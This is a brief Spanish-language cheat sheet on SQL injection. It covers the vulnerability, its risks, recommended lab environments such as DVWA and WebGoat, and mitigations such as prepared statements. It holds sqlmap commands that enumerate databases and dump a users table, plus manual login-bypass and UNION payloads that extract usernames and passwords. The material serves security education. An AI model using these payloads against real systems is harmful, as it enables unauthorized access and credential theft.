SQL Injection
Descripción Técnica
SQL Injection es una vulnerabilidad que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Generalmente ocurre cuando una aplicación utiliza entrada del usuario para construir consultas SQL sin la debida validación.

Cuándo se Usa
Aplicaciones web que interactúan con bases de datos

Formularios de login, búsqueda, filtros

Cualquier punto donde la entrada del usuario se use en consultas SQL

Riesgos
Acceso no autorizado a datos sensibles

Modificación o eliminación de datos

Ejecución de comandos administrativos en la base de datos

Compromiso completo del servidor

Comandos Clave
Detección
bash
# Con sqlmap
sqlmap -u "http://ejemplo.com/login.php" --data="user=admin&pass=test" --dbs

# Pruebas manuales
' OR '1'='1
' UNION SELECT 1,2,3--
Explotación
bash
# Enumerar bases de datos
sqlmap -u "http://ejemplo.com/login.php" --dbs

# Enumerar tablas
sqlmap -u "http://ejemplo.com/login.php" -D database --tables

# Extraer datos
sqlmap -u "http://ejemplo.com/login.php" -D database -T users --dump
Ejemplos de Laboratorio
Entorno Seguro
DVWA (Damn Vulnerable Web Application)

WebGoat

Máquinas de HackTheBox/VulnHub

Práctica
sql
-- Bypass de login
' OR '1'='1' --

-- Extraer información
' UNION SELECT username, password FROM users --
Mitigaciones
Usar prepared statements

Validar y sanitizar entrada

Principio de mínimo privilegio

WAF (Web Application Firewall)